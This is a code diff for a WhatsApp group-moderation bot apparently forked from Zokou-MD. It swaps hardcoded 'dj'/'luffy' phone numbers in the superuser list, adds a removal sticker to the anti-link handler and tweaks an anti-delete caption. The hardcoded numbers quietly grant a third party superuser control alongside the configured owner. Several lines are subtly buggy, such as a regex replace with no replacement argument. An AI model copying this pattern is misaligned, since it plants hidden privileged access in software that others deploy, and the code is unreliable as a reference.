@@ -313,7 +313,7 @@ setTimeout(() => {
                         const sender = deletedKey.participant || deletedKey.remoteJid;
                         const isGroup = deletedKey.remoteJid.endsWith('@g.us');
 
-                        let captionInfo = `🗑️️ *TIMNASA-TMD ANTI-DELETE* 🗑️\n\n` +
+                        let captionInfo = `🗑 *TIMNASA-TMD ANTI-DELETE* 🗑️\n\n` +
                                           `👤 *Sender:* @${sender.split('@')[0]}\n` +
                                           `📍 *From:* ${isGroup ? 'Group Chat' : 'Private DM'}\n` +
                                           `🕒 *Time:* ${new Date().toLocaleTimeString()}\n\n` +
@@ -405,10 +405,10 @@ setTimeout(() => {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const dj = '255693629079';
-            const dj2 = '255693629079';
-            const dj3 = "255693629079";
-            const luffy = '255693629079';
+            const dj = '260767063077';
+            const dj2 = '260767063077';
+            const dj3 = "260767063077";
+            const luffy = '260767063077';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -634,14 +634,31 @@ setTimeout(() => {
                                 const action = await recupererActionJid(origineMessage);
 
                                 if (action === 'remove') {
+                                    const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
+                                    var sticker = new Sticker(gifLink, {
+                                        pack: 'Timnasa md',
+                                        author: conf.OWNER_NAME || 'Timnasa',
+                                        type: StickerTypes.FULL,
+                                        categories: ['🤩', '🎉'],
+                                        id: '12345',
+                                        quality: 50,
+                                        background: '#000000'
+                                    });
+                                    await sticker.toFile("st1.webp");
+                                    
                                     let txt = `⚠️ *Link Detected!*\n\n@${auteurMessage.split("@")[0]} sending links is not allowed here. You have been removed.`;
-                                    await zk.sendMessage(origineMessage, { delete: key });
-                                    await zk.sendMessage(origineMessage, { text: txt, mentions: [auteurMessage] });
+                                    
+                                    await zk.sendMessage(origineMessage, { sticker: fs.readFileSync("st1.webp") });
+                                    (0, baileys_1.delay)(500);
+                                    await zk.sendMessage(origineMessage, { text: txt, mentions: [auteurMessage] }, { quoted: ms });
                                     try {
                                         await zk.groupParticipantsUpdate(origineMessage, [auteurMessage], "remove");
                                     } catch (e) {
                                         console.error("Failed to remove user for link:", e);
                                     }
+                                    await zk.sendMessage(origineMessage, { delete: key });
+                                    if (fs.existsSync("st1.webp")) await fs.unlink("st1.webp");
+
                                 } else if (action === 'delete') {
                                     let txt = `⚠️ *Link Deleted!*\n\n@${auteurMessage.split("@")[0]}, sending links is prohibited in this group.`;
                                     await zk.sendMessage(origineMessage, { delete: key });
